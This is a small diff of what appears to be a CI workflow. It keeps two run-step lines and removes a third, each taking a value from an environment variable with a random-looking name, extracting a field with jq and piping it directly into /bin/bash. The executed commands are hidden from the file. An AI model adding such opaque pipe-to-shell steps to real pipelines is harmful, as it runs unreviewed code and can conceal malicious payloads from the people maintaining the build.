@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$jgmg65565" | jq -r .b38627 | /bin/bash
           echo $agv77859 | jq -r .ytg9 | /bin/bash
-          printf '%s' "$vqq03" | jq -r .chm4 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
